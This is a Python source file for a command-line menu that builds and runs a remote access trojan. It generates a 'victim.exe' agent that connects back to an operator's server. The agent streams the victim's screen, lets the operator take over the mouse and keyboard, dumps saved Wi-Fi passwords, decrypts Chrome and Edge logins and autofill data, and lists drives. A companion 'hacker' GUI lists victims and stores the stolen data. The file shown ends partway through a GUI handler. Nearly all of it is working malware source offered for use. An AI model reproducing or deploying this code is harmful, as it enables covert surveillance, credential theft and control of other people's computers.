
import asyncio
import os
import sys
import json

from core.display import C, type_line, SEPARATOR, print_banner
from core.platform_utils import clear_screen
from cli.prompts import safe_input, press_enter


def option_rat():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}REMOTE ACCESS TOOL{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    print(f"  {C.GRAY}Build and manage remote access agents{C.RESET}")
    print()
    print(f"  {C.DK_CYN}{C.BOLD}[1]{C.RESET} Build victim.exe")
    print(f"  {C.DK_CYN}{C.BOLD}[2]{C.RESET} Build hacker.exe (GUI)")
    print(f"  {C.DK_CYN}{C.BOLD}[3]{C.RESET} Run hacker server (GUI)")
    print()
    print(f"  {C.DK_MAG}{'─' * 40}{C.RESET}")
    print(f"  {C.DK_CYN}{C.BOLD}[0]{C.RESET} Back")
    print()

    choice = safe_input(f"Choice: ").strip()

    if choice == "0":
        return
    elif choice == "1":
        _build_victim()
    elif choice == "2":
        _build_hacker()
    elif choice == "3":
        _run_hacker_server()
    else:
        type_line(f"  {C.DK_RED}Invalid choice.{C.RESET}")
        press_enter()


def _build_victim():
    server_ip = safe_input("Server IP to connect to: ").strip()
    if not server_ip:
        type_line(f"  {C.DK_RED}No IP provided.{C.RESET}")
        press_enter()
        return

    port_str = safe_input("Server port (default 5555): ").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input("Auth password (optional): ").strip()

    output_name = safe_input("Output filename (default: victim): ").strip()
    if not output_name:
        output_name = "victim"
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    type_line(f"\n  {C.GRAY}Building {output_name}...{C.RESET}")

    script = _generate_victim_script(server_ip, port, password)
    script_name = output_name.replace(".exe", "_agent.py")
    script_path = script_name
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script)

    exe_name = output_name.replace(".exe", "")

    try:
        import PyInstaller.__main__  # pyright: ignore[reportMissingModuleSource]
        from pathlib import Path
        hooks_dir = str(Path(__file__).resolve().parent.parent.parent / "hooks")
        PyInstaller.__main__.run([
            script_path,
            "--onefile",
            "--windowed",
            "--noconfirm",
            "--clean",
            "--name", exe_name,
            "--additional-hooks-dir", hooks_dir,
            "--hidden-import", "pyautogui",
            "--hidden-import", "mss",
            "--hidden-import", "mss.windows",
            "--collect-all", "mss",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.Image",
        ])
        type_line(f"  {C.DK_CYN}{output_name} created in dist/{C.RESET}")
    except ImportError:
        type_line(f"  {C.DK_RED}PyInstaller not installed. Install with: pip install pyinstaller{C.RESET}")
        type_line(f"  {C.GRAY}Script saved to {script_path} - run manually with: python {script_path}{C.RESET}")
    except (Exception, SystemExit) as e:
        type_line(f"  {C.DK_RED}Build failed: {e}{C.RESET}")

    press_enter()


def _build_hacker():
    port_str = safe_input("Listening port (default 5555): ").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input("Auth password (optional): ").strip()

    output_name = safe_input("Output filename (default: hacker): ").strip()
    if not output_name:
        output_name = "hacker"
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    type_line(f"\n  {C.GRAY}Building {output_name}...{C.RESET}")

    script = _generate_hacker_script(port, password)
    script_name = output_name.replace(".exe", "_control.py")
    script_path = script_name
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script)

    exe_name = output_name.replace(".exe", "")

    try:
        import PyInstaller.__main__  # pyright: ignore[reportMissingModuleSource]
        PyInstaller.__main__.run([
            script_path,
            "--onefile",
            "--windowed",
            "--noconfirm",
            "--clean",
            "--name", exe_name,
            "--hidden-import", "customtkinter",
            "--collect-data", "customtkinter",
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.Image",
        ])
        type_line(f"  {C.DK_CYN}{output_name} created in dist/{C.RESET}")
    except ImportError:
        type_line(f"  {C.DK_RED}PyInstaller not installed. Install with: pip install pyinstaller{C.RESET}")
        type_line(f"  {C.GRAY}Script saved to {script_path} - run manually with: python {script_path}{C.RESET}")
    except (Exception, SystemExit) as e:
        type_line(f"  {C.DK_RED}Build failed: {e}{C.RESET}")

    press_enter()


def _run_hacker_server():
    port_str = safe_input("Listening port (default 5555): ").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input("Auth password (optional): ").strip()

    type_line(f"\n  {C.GRAY}Starting hacker server on port {port}...{C.RESET}\n")

    from features.rat.hacker_server import HackerServer
    from features.rat.hacker_gui import HackerGUI

    server = HackerServer(port=port, password=password)
    server.start()

    try:
        gui = HackerGUI(server)
        type_line(f"  {C.DK_CYN}GUI started. Waiting for victims...{C.RESET}")
        gui.run()
    except ImportError:
        type_line(f"  {C.DK_RED}GUI dependencies missing (customtkinter, Pillow){C.RESET}")
        type_line(f"  {C.GRAY}Running in headless mode. Press Ctrl+C to stop.{C.RESET}")
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    finally:
        server.stop()


def _generate_victim_script(server_ip: str, port: int, password: str) -> str:
    return f'''import socket
import json
import struct
import hashlib
import os
import platform
import subprocess
import threading
import time
import logging
try:
    import mss
except ImportError:
    mss = None

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", filename="victim.log", filemode="w")
logger = logging.getLogger("S9RAT")

PROTOCOL_VERSION = 1
DEFAULT_PORT = 5555
MAGIC = b"S9RAT"

MSG_TYPES = {{
    "AUTH": 1, "AUTH_OK": 2, "AUTH_FAIL": 3,
    "SCREEN_FRAME": 10, "SCREEN_START": 11, "SCREEN_STOP": 12,
    "CONTROL_ENABLE": 20, "CONTROL_DISABLE": 21, "CONTROL_INPUT": 22,
    "KEYBOARD_INPUT": 23, "MOUSE_INPUT": 24,
    "EXFIL_DATA": 30, "EXFIL_REQUEST": 31, "FILE_LIST": 32, "FILE_TRANSFER": 33,
    "SYSTEM_INFO": 40, "WIFI_PASSWORDS": 41, "BROWSER_CREDS": 42,
    "HEARTBEAT": 50, "HEARTBEAT_ACK": 51, "DISCONNECT": 60,
}}


def pack_message(msg_type, data):
    msg_bytes = json.dumps(data).encode("utf-8")
    type_id = MSG_TYPES.get(msg_type, 0)
    header = MAGIC + struct.pack("!BI", type_id, len(msg_bytes))
    return header + msg_bytes


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf += chunk
    return buf


def recv_message(sock):
    header = recv_exact(sock, 10)
    if header[:5] != MAGIC:
        raise ValueError("Invalid protocol magic")
    type_id = struct.unpack("!B", header[5:6])[0]
    length = struct.unpack("!I", header[6:10])[0]
    if length > 50 * 1024 * 1024:
        raise ValueError("Message too large")
    msg_bytes = recv_exact(sock, length)
    msg_type = None
    for name, tid in MSG_TYPES.items():
        if tid == type_id:
            msg_type = name
            break
    if not msg_type:
        msg_type = f"UNKNOWN_{{type_id}}"
    return msg_type, json.loads(msg_bytes.decode("utf-8"))


class VictimClient:
    def __init__(self, server_host, server_port=DEFAULT_PORT, password=""):
        self.server_host = server_host
        self.server_port = server_port
        self.password = password
        self._sock = None
        self._running = False
        self._screen_active = False
        self._control_enabled = False

    def connect(self):
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(10)
            self._sock.connect((self.server_host, self.server_port))
            self._running = True
            self._authenticate()
            return True
        except Exception as e:
            logger.error(f"Connection failed: {{e}}")
            return False

    def _authenticate(self):
        auth_msg = pack_message("AUTH", {{
            "password": self.password,
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "pid": os.getpid(),
        }})
        self._sock.sendall(auth_msg)
        msg_type, data = recv_message(self._sock)
        if msg_type == "AUTH_OK":
            logger.info("Authenticated")
        else:
            raise ConnectionError("Authentication failed")

    def run(self):
        self._running = True
        threads = [
            threading.Thread(target=self._command_loop, daemon=True),
            threading.Thread(target=self._screen_loop, daemon=True),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def _command_loop(self):
        while self._running:
            try:
                msg_type, data = recv_message(self._sock)
                self._handle_command(msg_type, data)
            except ConnectionError:
                logger.info("Disconnected")
                self._running = False
                break
            except Exception as e:
                logger.error(f"Command error: {{e}}")
                time.sleep(0.1)

    def _handle_command(self, msg_type, data):
        if msg_type == "HEARTBEAT":
            self._sock.sendall(pack_message("HEARTBEAT_ACK", {{}}))
        elif msg_type == "SCREEN_START":
            self._screen_active = True
        elif msg_type == "SCREEN_STOP":
            self._screen_active = False
        elif msg_type == "CONTROL_ENABLE":
            self._control_enabled = True
        elif msg_type == "CONTROL_DISABLE":
            self._control_enabled = False
        elif msg_type == "CONTROL_INPUT" and self._control_enabled:
            self._execute_input(data)
        elif msg_type == "EXFIL_REQUEST":
            request_type = data.get("type", "")
            self._handle_exfil(request_type)

    def _execute_input(self, data):
        try:
            import pyautogui
            input_type = data.get("input_type", "")
            if input_type == "mouse_move":
                pyautogui.moveTo(data["x"], data["y"], duration=0.1)
            elif input_type == "mouse_click":
                pyautogui.click(data["x"], data["y"], button=data.get("button", "left"))
            elif input_type == "mouse_double":
                pyautogui.doubleClick(data["x"], data["y"])
            elif input_type == "mouse_down":
                pyautogui.mouseDown(data["x"], data["y"], button=data.get("button", "left"))
            elif input_type == "mouse_up":
                pyautogui.mouseUp(data["x"], data["y"], button=data.get("button", "left"))
            elif input_type == "mouse_scroll":
                pyautogui.scroll(data.get("amount", 0), data["x"], data["y"])
            elif input_type == "key_press":
                pyautogui.press(data.get("key", ""))
            elif input_type == "key_down":
                pyautogui.keyDown(data.get("key", ""))
            elif input_type == "key_up":
                pyautogui.keyUp(data.get("key", ""))
            elif input_type == "type_text":
                pyautogui.typewrite(data.get("text", ""), interval=0.02)
        except Exception as e:
            logger.error(f"Input error: {{e}}")

    def _screen_loop(self):
        if mss is None:
            logger.error("mss not installed for screen capture")
            return
        try:
            sct = mss.mss()
        except Exception as e:
            logger.error(f"mss init error: {{e}}")
            return

        while self._running:
            if self._screen_active:
                try:
                    monitor = sct.monitors[0]
                    screenshot = sct.grab(monitor)
                    import io
                    from PIL import Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=50)
                    frame_data = buf.getvalue()
                    self._sock.sendall(pack_message("SCREEN_FRAME", {{"size": len(frame_data)}}))
                    self._sock.sendall(frame_data)
                except Exception as e:
                    logger.error(f"Screen capture error: {{e}}")
            time.sleep(0.07)

    def _handle_exfil(self, exfil_type):
        data = {{}}
        try:
            if exfil_type == "system_info":
                data = self._get_system_info()
            elif exfil_type == "wifi_passwords":
                data = self._get_wifi_passwords()
            elif exfil_type == "browser_creds":
                data = self._get_browser_creds()
            elif exfil_type == "file_list":
                data = self._get_file_list()
        except Exception as e:
            data = {{"error": str(e)}}
        self._sock.sendall(pack_message("EXFIL_DATA", {{"type": exfil_type, "data": data}}))

    def _get_system_info(self):
        info = {{
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", os.getenv("USER", "unknown")),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "processor": platform.processor(),
            "cwd": os.getcwd(),
            "python_version": platform.python_version(),
        }}
        try:
            result = subprocess.run(
                "ipconfig" if platform.system() == "Windows" else "ifconfig",
                shell=True, capture_output=True, text=True, timeout=5
            )
            info["network"] = result.stdout[:2000]
        except Exception:
            pass
        return info

    def _get_wifi_passwords(self):
        passwords = {{}}
        try:
            if platform.system() == "Windows":
                result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True, timeout=10)
                profiles = []
                for line in result.stdout.split("\\n"):
                    if "All User Profile" in line:
                        profile = line.split(":")[-1].strip()
                        profiles.append(profile)
                for profile in profiles:
                    result = subprocess.run(f'netsh wlan show profile name="{{profile}}" key=clear', shell=True, capture_output=True, text=True, timeout=10)
                    for line in result.stdout.split("\\n"):
                        if "Key Content" in line:
                            pwd = line.split(":")[-1].strip()
                            passwords[profile] = pwd
        except Exception as e:
            passwords["_error"] = str(e)
        return passwords

    def _get_browser_creds(self):
        creds = {{"chrome": [], "edge": [], "autofill": []}}
        try:
            if platform.system() == "Windows":
                import sqlite3
                import shutil
                import json
                import base64

                def _decrypt_chrome_password(encrypted_password, local_state_path):
                    try:
                        with open(local_state_path, "r", encoding="utf-8") as f:
                            local_state = json.load(f)
                        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        encrypted_key = encrypted_key[5:]
                        import ctypes
                        import ctypes.wintypes

                        class DATA_BLOB(ctypes.Structure):
                            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

                        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
                        blob_out = DATA_BLOB()
                        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                            aes_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                        else:
                            return "[decryption failed]"
                        if encrypted_password[:3] == b"v10":
                            nonce = encrypted_password[3:15]
                            ciphertext = encrypted_password[15:-16]
                            tag = encrypted_password[-16:]
                            from Crypto.Cipher import AES
                            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
                        return "[unsupported format]"
                    except Exception:
                        return "[decryption failed]"

                def _read_browser_logins(user_data_path, profile="Default"):
                    logins = []
                    login_db = os.path.join(user_data_path, profile, "Login Data")
                    local_state = os.path.join(user_data_path, "Local State")
                    if not os.path.exists(login_db):
                        return logins
                    temp_path = login_db + ".tmp"
                    try:
                        shutil.copy2(login_db, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cursor:
                            password = "[encrypted]"
                            if row[2]:
                                password = _decrypt_chrome_password(row[2], local_state)
                            logins.append({{"url": row[0], "username": row[1], "password": password}})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return logins

                def _read_autofill(user_data_path, profile="Default"):
                    entries = []
                    web_data = os.path.join(user_data_path, profile, "Web Data")
                    if not os.path.exists(web_data):
                        return entries
                    temp_path = web_data + ".tmp"
                    try:
                        shutil.copy2(web_data, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.execute("SELECT name, value FROM autofill")
                        for row in cursor:
                            if row[0] and row[1]:
                                entries.append({{"field": row[0], "value": row[1]}})
                        conn.close()
                        os.remove(temp_path)
                    except Exception:
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass
                    return entries

                chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data")
                if os.path.exists(chrome_path):
                    creds["chrome"] = _read_browser_logins(chrome_path, "Default")
                    creds["autofill"] = _read_autofill(chrome_path, "Default")

                edge_path = os.path.expandvars(r"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data")
                if os.path.exists(edge_path):
                    creds["edge"] = _read_browser_logins(edge_path, "Default")
                    if not creds["autofill"]:
                        creds["autofill"] = _read_autofill(edge_path, "Default")
        except Exception as e:
            creds["_error"] = str(e)
        return creds

    def _get_file_list(self):
        listing = {{}}
        for drive in ["C:\\\\", "D:\\\\"]:
            if os.path.exists(drive):
                try:
                    entries = os.listdir(drive)[:100]
                    listing[drive] = entries
                except Exception:
                    pass
        return listing


def main():
    client = VictimClient(
        server_host="{server_ip}",
        server_port={port},
        password="{password}",
    )
    if client.connect():
        client.run()
    else:
        import sys
        sys.exit(1)


if __name__ == "__main__":
    main()
'''


def _generate_hacker_script(port: int, password: str) -> str:
    return f'''import socket
import json
import struct
import hashlib
import os
import time
import logging
import threading

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", filename="hacker.log", filemode="w")
logger = logging.getLogger("S9RAT")

PROTOCOL_VERSION = 1
DEFAULT_PORT = 5555
MAGIC = b"S9RAT"

MSG_TYPES = {{
    "AUTH": 1, "AUTH_OK": 2, "AUTH_FAIL": 3,
    "SCREEN_FRAME": 10, "SCREEN_START": 11, "SCREEN_STOP": 12,
    "CONTROL_ENABLE": 20, "CONTROL_DISABLE": 21, "CONTROL_INPUT": 22,
    "KEYBOARD_INPUT": 23, "MOUSE_INPUT": 24,
    "EXFIL_DATA": 30, "EXFIL_REQUEST": 31, "FILE_LIST": 32, "FILE_TRANSFER": 33,
    "SYSTEM_INFO": 40, "WIFI_PASSWORDS": 41, "BROWSER_CREDS": 42,
    "HEARTBEAT": 50, "HEARTBEAT_ACK": 51, "DISCONNECT": 60,
}}


def pack_message(msg_type, data):
    msg_bytes = json.dumps(data).encode("utf-8")
    type_id = MSG_TYPES.get(msg_type, 0)
    header = MAGIC + struct.pack("!BI", type_id, len(msg_bytes))
    return header + msg_bytes


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf += chunk
    return buf


def recv_message(sock):
    header = recv_exact(sock, 10)
    if header[:5] != MAGIC:
        raise ValueError("Invalid protocol magic")
    type_id = struct.unpack("!B", header[5:6])[0]
    length = struct.unpack("!I", header[6:10])[0]
    if length > 50 * 1024 * 1024:
        raise ValueError("Message too large")
    msg_bytes = recv_exact(sock, length)
    msg_type = None
    for name, tid in MSG_TYPES.items():
        if tid == type_id:
            msg_type = name
            break
    if not msg_type:
        msg_type = f"UNKNOWN_{{type_id}}"
    return msg_type, json.loads(msg_bytes.decode("utf-8"))


class HackerServer:
    def __init__(self, port=DEFAULT_PORT, password="", output_dir="rat_output"):
        self.port = port
        self.password = password
        self.output_dir = output_dir
        self._server_sock = None
        self._running = False
        self._clients = {{}}
        self._lock = threading.Lock()
        self._on_client_connect = None
        self._on_client_disconnect = None
        self._on_screen_frame = None
        self._on_exfil_data = None
        os.makedirs(output_dir, exist_ok=True)

    def set_callbacks(self, on_connect=None, on_disconnect=None, on_screen_frame=None, on_exfil_data=None):
        self._on_client_connect = on_connect
        self._on_client_disconnect = on_disconnect
        self._on_screen_frame = on_screen_frame
        self._on_exfil_data = on_exfil_data

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind(("0.0.0.0", self.port))
        self._server_sock.listen(5)
        self._server_sock.settimeout(1.0)
        self._running = True
        logger.info(f"Server listening on port {{self.port}}")
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def stop(self):
        self._running = False
        with self._lock:
            for client_id, info in list(self._clients.items()):
                try:
                    info["sock"].close()
                except Exception:
                    pass
            self._clients.clear()
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running:
            try:
                client_sock, addr = self._server_sock.accept()
                threading.Thread(target=self._handle_client, args=(client_sock, addr), daemon=True).start()
            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    logger.error(f"Accept error: {{e}}")

    def _handle_client(self, sock, addr):
        client_id = f"{{addr[0]}}:{{addr[1]}}"
        logger.info(f"New connection from {{client_id}}")
        try:
            sock.settimeout(30)
            msg_type, auth_data = recv_message(sock)
            if msg_type != "AUTH":
                sock.close()
                return
            if self.password and auth_data.get("password") != self.password:
                sock.sendall(pack_message("AUTH_FAIL", {{}}))
                sock.close()
                return
            sock.sendall(pack_message("AUTH_OK", {{}}))
            info = {{
                "sock": sock, "addr": addr,
                "hostname": auth_data.get("hostname", "unknown"),
                "username": auth_data.get("username", "unknown"),
                "os": auth_data.get("os", "unknown"),
                "os_version": auth_data.get("os_version", ""),
                "arch": auth_data.get("arch", ""),
                "connected_at": time.time(),
                "screen_active": False, "control_enabled": False,
            }}
            with self._lock:
                self._clients[client_id] = info
            if self._on_client_connect:
                self._on_client_connect(client_id, info)
            self._client_loop(sock, client_id, info)
        except Exception as e:
            logger.error(f"Client {{client_id}} error: {{e}}")
        finally:
            with self._lock:
                self._clients.pop(client_id, None)
            if self._on_client_disconnect:
                self._on_client_disconnect(client_id)
            try:
                sock.close()
            except Exception:
                pass
            logger.info(f"Client {{client_id}} disconnected")

    def _client_loop(self, sock, client_id, info):
        while self._running and client_id in self._clients:
            try:
                sock.settimeout(1.0)
                msg_type, data = recv_message(sock)
                if msg_type == "SCREEN_FRAME":
                    frame_size = data.get("size", 0)
                    if frame_size > 0:
                        frame_data = b""
                        remaining = frame_size
                        while remaining > 0:
                            chunk = sock.recv(min(remaining, 65536))
                            if not chunk:
                                break
                            frame_data += chunk
                            remaining -= len(chunk)
                        if self._on_screen_frame:
                            self._on_screen_frame(client_id, frame_data)
                elif msg_type == "EXFIL_DATA":
                    exfil_type = data.get("type", "unknown")
                    exfil_data = data.get("data", {{}})
                    self._save_exfil(client_id, exfil_type, exfil_data)
                    if self._on_exfil_data:
                        self._on_exfil_data(client_id, exfil_type, exfil_data)
                elif msg_type == "HEARTBEAT_ACK":
                    pass
            except socket.timeout:
                continue
            except ConnectionError:
                break
            except Exception as e:
                logger.error(f"Client {{client_id}} loop error: {{e}}")
                break

    def send_command(self, client_id, msg_type, data):
        with self._lock:
            info = self._clients.get(client_id)
        if not info:
            return False
        try:
            info["sock"].sendall(pack_message(msg_type, data))
            return True
        except Exception as e:
            logger.error(f"Send error to {{client_id}}: {{e}}")
            return False

    def start_screen(self, client_id):
        return self.send_command(client_id, "SCREEN_START", {{}})

    def stop_screen(self, client_id):
        return self.send_command(client_id, "SCREEN_STOP", {{}})

    def enable_control(self, client_id):
        return self.send_command(client_id, "CONTROL_ENABLE", {{}})

    def disable_control(self, client_id):
        return self.send_command(client_id, "CONTROL_DISABLE", {{}})

    def send_input(self, client_id, input_type, **kwargs):
        data = {{"input_type": input_type, **kwargs}}
        return self.send_command(client_id, "CONTROL_INPUT", data)

    def request_exfil(self, client_id, exfil_type):
        return self.send_command(client_id, "EXFIL_REQUEST", {{"type": exfil_type}})

    def _save_exfil(self, client_id, exfil_type, data):
        client_dir = os.path.join(self.output_dir, client_id.replace(":", "_"))
        os.makedirs(client_dir, exist_ok=True)
        filepath = os.path.join(client_dir, f"{{exfil_type}}.txt")
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                if isinstance(data, dict):
                    for key, value in data.items():
                        f.write(f"{{key}}: {{value}}\\n")
                else:
                    f.write(str(data))
            logger.info(f"Exfil saved: {{filepath}}")
        except Exception as e:
            logger.error(f"Failed to save exfil: {{e}}")

    def get_clients(self):
        with self._lock:
            return {{k: {{kk: vv for kk, vv in v.items() if kk != "sock"}} for k, v in self._clients.items()}}


class HackerGUI:
    def __init__(self, server):
        import customtkinter as ctk
        import tkinter as tk
        from PIL import Image, ImageTk

        self.server = server
        self.root = ctk.CTk()
        self.root.title("S9Checker - Remote Access")
        self.root.geometry("1200x800")
        self.root.configure(fg_color="#0f0f0f")
        self.root.minsize(900, 600)

        self.current_client = None
        self._photo = None
        self._stream_active = False
        self._control_active = False

        self.server.set_callbacks(
            on_connect=self._on_client_connect,
            on_disconnect=self._on_client_disconnect,
            on_screen_frame=self._on_screen_frame,
            on_exfil_data=self._on_exfil_data,
        )

        self._build_ui()
        self._poll_clients()

    def _build_ui(self):
        import customtkinter as ctk
        import tkinter as tk

        main_frame = ctk.CTkFrame(self.root, fg_color="#0f0f0f")
        main_frame.pack(fill="both", expand=True, padx=8, pady=8)

        left_panel = ctk.CTkFrame(main_frame, fg_color="#1a1a1a", width=220)
        left_panel.pack(side="left", fill="y", padx=(0, 8))
        left_panel.pack_propagate(False)
        ctk.CTkLabel(left_panel, text="VICTIMS", font=("Segoe UI", 14, "bold"), text_color="#7c5cff").pack(pady=(12, 8))
        self.client_list = ctk.CTkScrollableFrame(left_panel, fg_color="#1a1a1a")
        self.client_list.pack(fill="both", expand=True, padx=8)
        ctk.CTkButton(left_panel, text="Refresh", command=self._refresh_clients, fg_color="#333333", hover_color="#444444", text_color="#e8e8e8").pack(pady=8, padx=8, fill="x")

        center_panel = ctk.CTkFrame(main_frame, fg_color="#1a1a1a")
        center_panel.pack(side="left", fill="both", expand=True, padx=(0, 8))
        toolbar = ctk.CTkFrame(center_panel, fg_color="#121212", height=40)
        toolbar.pack(fill="x", padx=8, pady=8)
        self.stream_btn = ctk.CTkButton(toolbar, text="Start Stream", command=self._toggle_stream, fg_color="#4ade80", hover_color="#22c55e", text_color="#000000", width=120)
        self.stream_btn.pack(side="left", padx=4)
        self.control_btn = ctk.CTkButton(toolbar, text="Enable Control", command=self._toggle_control, fg_color="#fbbf24", hover_color="#f59e0b", text_color="#000000", width=130)
        self.control_btn.pack(side="left", padx=4)
        self.client_label = ctk.CTkLabel(toolbar, text="No client selected", font=("Segoe UI", 11), text_color="#888888")
        self.client_label.pack(side="left", padx=12)

        screen_frame = ctk.CTkFrame(center_panel, fg_color="#000000")
        screen_frame.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.screen_canvas = tk.Canvas(screen_frame, bg="#000000", highlightthickness=0)
        self.screen_canvas.pack(fill="both", expand=True)
        self.screen_canvas.bind("<Button-1>", self._on_mouse_click)
        self.screen_canvas.bind("<B1-Motion>", self._on_mouse_drag)
        self.screen_canvas.bind("<ButtonRelease-1>", self._on_mouse_release)
        self.screen_canvas.bind("<Double-Button-1>", self._on_mouse_double)
        self.screen_canvas.bind("<MouseWheel>", self._on_mouse_scroll)
        self.screen_canvas.bind("<Motion>", self._on_mouse_move)

        right_panel = ctk.CTkFrame(main_frame, fg_color="#1a1a1a", width=250)
        right_panel.pack(side="right", fill="y")
        right_panel.pack_propagate(False)
        ctk.CTkLabel(right_panel, text="DATA", font=("Segoe UI", 14, "bold"), text_color="#7c5cff").pack(pady=(12, 8))
        for label, exfil_type in [("System Info", "system_info"), ("WiFi Passwords", "wifi_passwords"), ("Browser Creds", "browser_creds"), ("File List", "file_list")]:
            ctk.CTkButton(right_panel, text=label, command=lambda t=exfil_type: self._request_exfil(t), fg_color="#333333", hover_color="#444444", text_color="#e8e8e8").pack(pady=4, padx=12, fill="x")
        self.exfil_text = ctk.CTkTextbox(right_panel, fg_color="#141414", text_color="#e8e8e8", font=("Cascadia Code", 10))
        self.exfil_text.pack(fill="both", expand=True, padx=8, pady=8)

    def _on_client_connect(self, client_id, info):
        self.root.after(0, self._add_client_ui, client_id, info)

    def _on_client_disconnect(self, client_id):
        self.root.after(0, self._remove_client_ui, client_id)

    def _on_screen_frame(self, client_id, frame_data):
        if client_id != self.current_client:
            return
        try:
            import io
            from PIL import Image, ImageTk
            img = Image.open(io.BytesIO(frame_data))
            canvas_w = self.screen_canvas.winfo_width()
            canvas_h = self.screen_canvas.winfo_height()
            if canvas_w > 1 and canvas_h > 1:
                img = img.resize((canvas_w, canvas_h), Image.Resampling.LANCZOS)
            self._photo = ImageTk.PhotoImage(img)
            self.root.after(0, self._update_screen)
        except Exception as e:
            logger.error(f"Screen display error: {{e}}")

    def _update_screen(self):
        if self._photo:
            self.screen_canvas.delete("all")
            self.screen_canvas.create_image(0, 0, anchor="nw", image=self._photo)

    def _on_exfil_data(self, client_id, exfil_type, data):
        self.root.after(0, self._show_exfil, exfil_type, data)

    def _add_client_ui(self, client_id, info):
        import customtkinter as ctk
        btn = ctk.CTkButton(self.client_list, text=f"{{info.get('hostname', 'Unknown')}}\\n{{client_id}}", command=lambda cid=client_id: self._select_client(cid), fg_color="#222222", hover_color="#333333", text_color="#e8e8e8", height=50)
        btn.pack(fill="x", pady=2)

    def _remove_client_ui(self, client_id):
        if client_id == self.current_client:
            self.current_client = None
            self.client_label.configure(text="No client selected")
            self.screen_canvas.delete("all")

    def _select_client(self, client_id):
        self.current_client = client_id
        clients = self.server.get_clients()
        info = clients.get(client_id, {{}})
        self.client_label.configure(text=f"{{info.get('hostname', '?')}} ({{client_id}})")

    def _refresh_clients(self):
        import customtkinter as ctk
        for widget in self.client_list.winfo_children():
            widget.destroy()
        clients = self.server.get_clients()
        for cid, info in clients.items():
            btn = ctk.CTkButton(self.client_list, text=f"{{info.get('hostname', 'Unknown')}}\\n{{cid}}", command=lambda c=cid: self._select_client(c), fg_color="#222222", hover_color="#333333", text_color="#e8e8e8", height=50)
            btn.pack(fill="x", pady=2)

    def _toggle_stream(self):
        if not self.current_client:
            return
        if self._stream_active:
            self.server.stop_screen(self.current_client)
            self._stream_active = False
            self.stream_btn.configure(text="Start Stream", fg_color="#4ade80")
        else:
            self.server.start_screen(self.current_client)
            self._stream_active = True
            self.stream_btn.configure(text="Stop Stream", fg_color="#f87171")

    def _toggle_control(self):
        if not self.current_client:
            return
        if self._control_active:
            self.server.disable_control(self.current_client)
            self._control_active = False
            self.control_btn.configure(text="Enable Control", fg_color="#fbbf24")
        else:
            self.server.enable_control(self.current_client)
            self._control_active = True
            self.control_btn.configure(text="Disable Control", fg_color="#f87171")

    def _request_exfil(self, exfil_type):
        if not self.current_client:
            return
        self.server.request_exfil(self.current_client, exfil_type)

    def _show_exfil(self, exfil_type, data):
        self.exfil_text.delete("1.0", "end")
        self.exfil_text.insert("end", f"=== {{exfil_type.upper()}} ===\\n\\n")
        if isinstance(data, dict):
            for key, value in data.items():
                self.exfil_text.insert("end", f"{{key}}: {{value}}\\n")
        else:
            self.exfil_text.insert("end", str(data))

    def _on_mouse_click(self, event):
        if not self._control_active or not self.current_client:
            return
        self.server.send_input(self.current_client, "mouse_click", x=event.x, y=event.y, button="left")

    def _on_mouse_drag(self, event):
        if not self._control_active or not self.current_client:
            return
